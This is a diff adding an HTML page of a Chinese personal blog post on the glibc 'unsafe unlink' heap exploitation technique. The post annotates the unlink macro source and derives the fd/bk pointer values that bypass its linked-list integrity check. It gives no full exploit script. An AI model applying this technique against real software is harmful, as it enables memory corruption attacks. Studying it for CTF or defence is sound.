@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="unsafe_unlinkunlink利用条件 UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk  unlink源码123456789101112131415161718192021222324252627282930313233343536373839404142434445#d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsafe_unlink">
+<meta property="og:url" content="http://example.com/2022/01/08/unsafe_unlink/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="unsafe_unlinkunlink利用条件 UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk  unlink源码123456789101112131415161718192021222324252627282930313233343536373839404142434445#d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106173400643.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106173426013.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106183601842.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106184351893.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185229687.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106200336332.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185251614.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106185430766.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105182152889.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105204916321.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105212234289.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/20190902233014831.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105223409450.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105213710880.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105220942298.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222108043.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222242736.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220105222507126.png">
+<meta property="article:published_time" content="2022-01-07T16:13:03.343Z">
+<meta property="article:modified_time" content="2022-01-11T16:34:11.302Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20220106173400643.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>unsafe_unlink · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">unsafe_unlink</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                unsafe_unlink
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.9k</span>Reading time: <span class="post-count reading-time">18 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/01/08</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><h3 id="unlink利用条件"><a href="#unlink利用条件" class="headerlink" title="unlink利用条件"></a>unlink利用条件</h3><ol>
+<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>
+<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
+</ol>
+<h3 id="unlink源码"><a href="#unlink源码" class="headerlink" title="unlink源码"></a>unlink源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="comment">//判断chunk p的大小，是否与下一个chunk 的prev_size相等</span></span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line">    <span class="comment">//让FD指向p的下一个chunk，BK指向p的上一个chunk</span></span><br><span class="line">    FD = P-&gt;fd;                                   \</span><br><span class="line">    BK = P-&gt;bk;                                   \</span><br><span class="line">    <span class="comment">//以上是，chunk的大小在small bin范围内的断链操作</span></span><br><span class="line">    <span class="comment">//以下是，large bin，的断链操作，首先判断FD的bk，与BK的fd是否同时指向p</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);               \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                    \</span><br><span class="line">        <span class="comment">//首先进行初步断链，使FD的bk指向BK的fd，BK的fd指向FD，只是堆fd,bk的断链操作</span></span><br><span class="line">        FD-&gt;bk = BK;                                  \</span><br><span class="line">        BK-&gt;fd = FD;                                  \</span><br><span class="line">        <span class="comment">//以下使堆bk_nextsize,fd_nextsize的断链操作（large bin有两个双向链表，fd，bk用来</span></span><br><span class="line">        <span class="comment">//进行FIFO操作，bk_nextsize,fd_nextsize是根据堆块的大小进行排序的链表）</span></span><br><span class="line">        <span class="comment">//以下第一个if判断p的chunk是否在small范围内</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                 \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;            \</span><br><span class="line">            <span class="comment">//判断chunk p的下一个chunk的上一个节点，以及上一个chunk的下一个节点是不是p</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">          malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">          <span class="comment">//以下是luoarge bin的断链操作，首先判断chunk p的下下一个chunk的fd_nextsize是否为空</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                    \</span><br><span class="line">            <span class="comment">//p的下下一个chunk的fd_nextsize为空</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="line">                <span class="comment">//判断是否只有一个chunk p,是则如下</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                \</span><br><span class="line">                <span class="comment">//不是以下操作，四个指针，正常的双向链表的断链操作</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 \</span><br><span class="line">                  &#125;                               \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                \</span><br><span class="line">              <span class="comment">//p的下下一个chunk的fd_nextsize不为空，直接断链</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             \</span><br><span class="line">              &#125;                                   \</span><br><span class="line">          &#125;                                   \</span><br><span class="line">      &#125;                                       \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="unlink宏定义"><a href="#unlink宏定义" class="headerlink" title="unlink宏定义"></a>unlink宏定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV,P,BK,FD)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li>P:待取出的空闲chunk的指针</li>
+<li>BK：P后一个chunk的指针</li>
+<li>FD：P前一个chunk的指针</li>
+</ul>
+</blockquote>
+<h3 id="大小检查"><a href="#大小检查" class="headerlink" title="大小检查"></a>大小检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))   </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>若p物理相邻的后一个chunk的prev_size位的值与当前待脱链的空闲chunk的size不相等时报错</p>
+</blockquote>
+<h3 id="双向链表完整性检查"><a href="#双向链表完整性检查" class="headerlink" title="双向链表完整性检查"></a>双向链表完整性检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))            </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>绕过该检查需要满足以下式子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk == p  &lt;=&gt;  *(p-&gt;fd+<span class="number">0x18</span>) == p</span><br><span class="line">p-&gt;bk-&gt;fd == p  &lt;=&gt;  *(p-&gt;bk+<span class="number">0x10</span>) == p</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=&amp;p<span class="number">-0x18</span></span><br><span class="line">p-&gt;bk=&amp;p<span class="number">-0x10</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="满足以上条件后，进入unlink脱链环节："><a href="#满足以上条件后，进入unlink脱链环节：" class="headerlink" title="满足以上条件后，进入unlink脱链环节："></a>满足以上条件后，进入unlink脱链环节：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure>
+
+<p>绕过该检查应该满足以下公式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK &lt;=&gt; p-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(p-&gt;fd+<span class="number">0x18</span>) = p-&gt;bk</span><br><span class="line">∵p-&gt;fd = &amp;p<span class="number">-0x18</span></span><br><span class="line">∴*(&amp;p<span class="number">-0x18</span>+<span class="number">0x18</span>) = p-&gt;bk</span><br><span class="line">∴ p = p-&gt;bk</span><br><span class="line">∵ p-&gt;bk = &amp;p<span class="number">-0x10</span></span><br><span class="line">∴ p = &amp;p<span class="number">-0x10</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BK-&gt;fd = FD &lt;=&gt; p-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(p-&gt;bk+<span class="number">0x10</span>) = </span><br><span class="line">p-&gt;fd</span><br><span class="line">∵p-&gt;bk = &amp;p<span class="number">-0x10</span></span><br><span class="line">∴*(&amp;p<span class="number">-0x10</span>+<span class="number">0x10</span>) = p-&gt;fd</span><br><span class="line">∴p = p-&gt;fd</span><br><span class="line">∵p-&gt;fd = &amp;p<span class="number">-0x18</span></span><br><span class="line">∴p = &amp;p<span class="number">-0x18</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="若为largebin-还须进行进一步操作"><a href="#若为largebin-还须进行进一步操作" class="headerlink" title="若为largebin,还须进行进一步操作"></a>若为largebin,还须进行进一步操作</h3><blockquote>
+<p>argebin 中还有 fdnextsize 以及 bknextsize 指针需要修改。</p>
+<p>smallbin 中的 chunk 的 fdnextsize 和 bknextsize 是没有意义的，即使是 largebin，也只有在相同尺寸的同一组 chunks 中的第一个 chunk 中 fdnextsize 以及 bknextsize 才有意义。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                \</span><br><span class="line">    &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见只有当 P-&gt;fdnextsize != null 时才需要修改，因为如果 P-&gt;fdnextsize == null ，说明 P 是尺寸相同的一组 chunks的非第一个 chunk，此时 P 的 fdnextsize 和 bknextsize 是没有意义的，自然没有修改的必要。</p>
+<p>否则操作如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                    </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             </span><br><span class="line">                <span class="keyword">else</span> &#123;                                </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 </span><br><span class="line">                  &#125;                               </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             </span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。继续判断 P-&gt;fd_nextsize == P ，因为当 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk 的话，是需要特别对待的，否则 FD 直接继承 P 的 fdnextsize 以及 bknextsize 即可。如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</p>
+</blockquote>
